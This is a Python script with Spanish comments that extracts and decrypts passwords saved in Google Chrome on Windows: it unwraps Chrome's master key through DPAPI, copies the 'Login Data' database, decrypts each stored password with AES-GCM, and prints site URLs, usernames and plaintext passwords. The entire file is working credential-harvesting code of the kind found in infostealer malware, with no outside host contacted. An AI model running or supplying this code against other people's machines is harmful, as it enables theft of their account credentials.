import os
import json
import base64
import sqlite3
import logging
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData

class ChromePasswordDecryptor:
    """Clase para descifrar contraseñas guardadas en Google Chrome."""

    def __init__(self):
        """Inicializa el objeto ChromePasswordDecryptor estableciendo la ruta a la base de datos
        de contraseñas de Chrome y obteniendo la clave de cifrado.
        """
        self.db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome", "User Data", "default", "Login Data")
        self.key = self.get_encryption_key()

    def get_encryption_key(self):
        """Obtiene la clave de cifrado de Chrome desde el archivo 'Local State'.

        Returns:
            bytes: Clave de cifrado descifrada.
        """
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                        "Google", "Chrome", "User Data", "Local State")
        try:
            with open(local_state_path, 'r', encoding='utf-8') as file:
                local_state = json.loads(file.read())
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]  # Elimina los primeros 5 bytes, que no son necesarios
            return CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception as e:
            logging.error(f"Fallo al obtener la clave de cifrado: {e}")
            return None

    def decrypt_password(self, password):
        """Descifra la contraseña usando la clave de cifrado obtenida.

        Args:
            password (bytes): Contraseña cifrada.

        Returns:
            str: Contraseña descifrada.
        """
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(self.key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except Exception:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[1])
            except Exception:
                return ""

    @staticmethod
    def get_chrome_datetime(chromedate):
        """Convierte el formato de fecha de Chrome a datetime.

        Args:
            chromedate (int): Fecha en formato Chrome (microsegundos desde el 1 de enero de 1601).

        Returns:
            datetime: Fecha convertida.
        """
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception:
            return None

    def extract_saved_passwords(self):
        """Extrae las contraseñas guardadas en la base de datos de Chrome.

        Yields:
            dict: Información de las contraseñas guardadas.
        """
        temp_db_path = "Chrome.db"
        try:
            shutil.copyfile(self.db_path, temp_db_path)
            with sqlite3.connect(temp_db_path) as db:
                cursor = db.cursor()
                cursor.execute("SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

                for row in cursor.fetchall():
                    yield {
                        "origin_url": row[0],
                        "action_url": row[1],
                        "username": row[2],
                        "password": self.decrypt_password(row[3]),
                        "date_created": self.get_chrome_datetime(row[4]),
                        "date_last_used": self.get_chrome_datetime(row[5])
                    }
        except Exception as e:
            logging.error(f"Error al extraer las passwords de Chrome: {e}")
        finally:
            try:
                os.remove(temp_db_path)
            except Exception as e:
                logging.error(f"Error al eliminar la base de datos temporal: {e}")

def main():
    """Función principal que inicializa el descifrado y muestra las contraseñas guardadas."""
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    decryptor = ChromePasswordDecryptor()
    for password_info in decryptor.extract_saved_passwords():
        print(password_info)

if __name__ == "__main__":
    main()
